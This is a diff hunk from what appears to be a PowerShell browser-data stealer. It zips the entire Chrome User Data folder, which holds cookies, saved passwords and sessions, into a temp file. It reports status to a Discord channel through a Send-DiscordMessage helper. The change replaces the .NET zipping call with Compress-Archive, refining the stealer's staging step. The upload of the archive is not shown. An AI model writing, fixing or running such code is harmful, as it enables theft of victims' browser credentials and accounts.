@@ -95,18 +95,14 @@ if (-not (Test-Path $chromePath)) {
     exit
 }
 
-# Load the necessary assembly for .NET compression
-Add-Type -AssemblyName "System.IO.Compression.FileSystem"
-
-# Create a zip of the Chrome User Data using .NET compression (alternative method)
+# Use Compress-Archive for zipping (this is a built-in PowerShell cmdlet)
 $outputZip = "$env:TEMP\chrome_data.zip"
 try {
-    # Create a new zip file
-    [System.IO.Compression.ZipFile]::CreateFromDirectory($chromePath, $outputZip)
+    Compress-Archive -Path $chromePath -DestinationPath $outputZip
 
     Write-Host "Compression successful, file saved at: $outputZip"
 } catch {
-    Send-DiscordMessage -message "Error creating zip file with .NET: $_"
+    Send-DiscordMessage -message "Error creating zip file with Compress-Archive: $_"
     exit
 }
 
